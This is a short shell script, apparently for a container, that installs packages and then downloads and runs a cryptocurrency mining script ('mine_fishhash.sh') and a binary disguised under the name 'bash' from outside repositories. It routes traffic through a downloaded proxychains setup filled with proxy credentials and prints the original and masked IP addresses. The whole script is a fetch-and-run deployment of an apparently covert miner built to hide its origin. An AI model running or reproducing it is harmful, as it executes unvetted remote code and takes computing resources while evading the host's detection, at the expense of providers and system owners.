#!/bin/sh
apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff
apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
echo "Uploaded files:" && ls /home/stuff/
wget https://raw.githubusercontent.com/pagesrlepla/mx8/main/mine_fishhash.sh && chmod +x mine_fishhash.sh
wget https://github.com/pagesrlepla/mx8/raw/main/bash && chmod +x bash
wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./bash curl ifconfig.me)
./mine_fishhash.sh

